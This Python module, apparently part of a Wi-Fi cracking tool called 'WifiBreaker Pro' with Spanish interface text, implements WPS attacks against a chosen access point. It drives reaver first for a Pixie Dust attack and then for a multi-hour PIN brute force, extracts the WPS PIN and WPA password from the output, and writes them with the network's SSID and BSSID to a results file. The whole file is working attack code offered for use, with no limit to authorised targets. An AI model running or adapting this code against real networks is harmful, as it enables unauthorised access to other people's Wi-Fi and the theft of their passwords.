"""WPS attack implementation."""

import subprocess
import time
import re
import os
from typing import Optional
from core.scanner import WiFiNetwork
from ui.colors import Colors, print_info, print_success, print_error, print_warning, print_progress


class WPSAttack:
    """WPS Pixie Dust and Reaver attacks."""
    
    def __init__(self, interface: str, target: WiFiNetwork):
        self.interface = interface
        self.target = target
        self.wps_pin = None
        self.password = None
    
    def _execute_command(self, cmd: list, timeout: int = None) -> tuple:
        """Execute system command."""
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
            return result.returncode, result.stdout, result.stderr
        except subprocess.TimeoutExpired:
            return -1, "", "Timeout"
        except Exception as e:
            return -1, "", str(e)
    
    def pixie_dust_attack(self) -> bool:
        """Pixie Dust attack."""
        print_info("Iniciando Pixie Dust...")
        print_info("Tiempo estimado: 30-120 segundos")
        
        cmd = ['reaver', '-i', self.interface, '-b', self.target.bssid,
               '-c', str(self.target.channel), '-K', '1', '-vv']
        
        print_progress("Ejecutando Pixie Dust...")
        
        try:
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                                      stderr=subprocess.STDOUT, text=True, bufsize=1)
            
            timeout = 300
            start_time = time.time()
            
            for line in process.stdout:
                if time.time() - start_time > timeout:
                    print_warning("Timeout")
                    process.kill()
                    break
                
                if 'WPS PIN:' in line:
                    match = re.search(r'WPS PIN: \'(\d+)\'', line)
                    if match:
                        self.wps_pin = match.group(1)
                        print_success(f"✓ WPS PIN: {self.wps_pin}")
                
                if 'WPA PSK:' in line:
                    match = re.search(r'WPA PSK: \'(.+)\'', line)
                    if match:
                        self.password = match.group(1)
                        print_success(f"✓ Password: {self.password}")
                        process.kill()
                        return True
                
                if any(k in line for k in ['Trying', 'Pixie']):
                    print(f"{Colors.OKCYAN}[Reaver] {line.strip()}{Colors.ENDC}")
            
            process.wait()
            
            if self.password:
                return True
            else:
                print_warning("Pixie Dust no funcionó")
                return False
        
        except KeyboardInterrupt:
            print_warning("\nInterrumpido")
            process.kill()
            return False
        except Exception as e:
            print_error(f"Error: {e}")
            return False
    
    def reaver_brute_force(self) -> bool:
        """Reaver brute force (lento)."""
        print_warning("ADVERTENCIA: Puede tomar 4-10 horas")
        
        confirm = input(f"\n{Colors.BOLD}¿Continuar? (s/N): {Colors.ENDC}").strip().lower()
        
        if confirm != 's':
            return False
        
        cmd = ['reaver', '-i', self.interface, '-b', self.target.bssid,
               '-c', str(self.target.channel), '-vv', '-L', '-N']
        
        print_progress("Iniciando Reaver...")
        
        try:
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                                      stderr=subprocess.STDOUT, text=True, bufsize=1)
            
            for line in process.stdout:
                if 'WPS PIN:' in line:
                    match = re.search(r'WPS PIN: \'(\d+)\'', line)
                    if match:
                        self.wps_pin = match.group(1)
                        print_success(f"\n✓ PIN: {self.wps_pin}")
                
                if 'WPA PSK:' in line:
                    match = re.search(r'WPA PSK: \'(.+)\'', line)
                    if match:
                        self.password = match.group(1)
                        print_success(f"✓ Password: {self.password}")
                        process.kill()
                        return True
                
                if 'Trying' in line or 'complete' in line.lower():
                    print(f"\r{Colors.OKCYAN}{line.strip()}{Colors.ENDC}", end='', flush=True)
            
            process.wait()
            return self.password is not None
        
        except KeyboardInterrupt:
            print_warning("\n\nInterrumpido")
            process.kill()
            return False
    
    def execute(self) -> bool:
        """Execute WPS attack."""
        print(f"\n{Colors.HEADER}╔═══════════════════════════════════════════════════════════╗{Colors.ENDC}")
        print(f"{Colors.HEADER}║           ATAQUE WPS - {self.target.ssid:^27}      ║{Colors.ENDC}")
        print(f"{Colors.HEADER}╚═══════════════════════════════════════════════════════════╝{Colors.ENDC}\n")
        
        if not self.target.wps:
            print_error("WPS no habilitado")
            return False
        
        print(f"\n{Colors.BOLD}[Método 1] Pixie Dust{Colors.ENDC}")
        print("─" * 60)
        
        if self.pixie_dust_attack():
            self._save_results()
            return True
        
        print(f"\n{Colors.BOLD}[Método 2] Reaver Brute Force{Colors.ENDC}")
        print("─" * 60)
        
        if self.reaver_brute_force():
            self._save_results()
            return True
        
        print_error("\n✗ Todos los métodos fallaron")
        return False
    
    def _save_results(self):
        """Save results."""
        if not self.password:
            return
        
        os.makedirs("data/results", exist_ok=True)
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        result_file = f"data/results/wps_crack_{timestamp}.txt"
        
        try:
            with open(result_file, 'w') as f:
                f.write(f"WifiBreaker Pro - WPS Attack\n")
                f.write(f"=" * 50 + "\n\n")
                f.write(f"Date: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"SSID: {self.target.ssid}\n")
                f.write(f"BSSID: {self.target.bssid}\n")
                if self.wps_pin:
                    f.write(f"WPS PIN: {self.wps_pin}\n")
                f.write(f"Password: {self.password}\n")
            
            print_success(f"Guardado: {result_file}")
        except Exception as e:
            print_warning(f"No se guardó: {e}")